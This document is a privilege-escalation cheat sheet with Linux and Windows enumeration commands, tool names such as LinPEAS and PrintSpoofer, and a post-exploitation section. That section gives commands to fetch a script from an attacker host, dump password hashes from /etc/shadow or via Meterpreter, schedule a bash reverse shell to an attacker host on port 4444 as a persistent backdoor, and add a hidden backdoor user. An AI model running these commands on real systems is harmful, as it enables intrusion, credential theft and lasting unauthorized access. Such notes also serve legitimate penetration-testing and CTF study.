# PRIVILEGE ESCALATION

## Linux Privilege Escalation

### Quick Checks
```bash
# Current user & groups
$ whoami
$ id
$ groups

# Sudo privileges (no password required?)
$ sudo -l

# SUID binaries
$ find / -perm -4000 -ls 2>/dev/null

# Cron jobs
$ crontab -l
$ cat /etc/cron*/
```

### Automated Enumeration
```bash
# LinPEAS - comprehensive enum
$ python3 -m http.server 80  # on attacker machine
$ wget http://attacker-ip/linPEAS.sh  # on target
$ chmod +x linpeas.sh
$ ./linpeas.sh

# PSpy - process spy (see hidden processes)
$ ./pspy64
```

### GTFOBins - Privilege Escalation via SUID
```bash
# Check: https://gtfobins.org
# Most common:
# - find (find -exec)
# - sudo (shell escape)
# - vim (vi /etc/sudoers)
# - nmap (--script bypass)
```

## Windows Privilege Escalation

### Basic Checks
```bash
# Current user & groups
> whoami
> net user
> net localgroup Administrators

# Check for unquoted service paths
> wmic service list brief

# Scheduled tasks
> tasklist /v
> Get-ScheduledTask
```

### Tools
- **WinPEAS:** Equivalent to LinPEAS
- **Juicy Potato:** Token impersonation
- **PrintSpoofer:** Printer service abuse
- **UAC bypass:** Various methods

## Post-Exploitation after Root/Admin
```bash
# Dump password hashes
$ cat /etc/shadow  # Linux
> hashdump  # Windows (Meterpreter)

# Create persistent backdoor
$ echo "bash -i >& /dev/tcp/attacker/4444 0>&1" | at now + 1 minute

# Add new user
$ useradd -m -p $(openssl passwd -1 password) backdoor
```

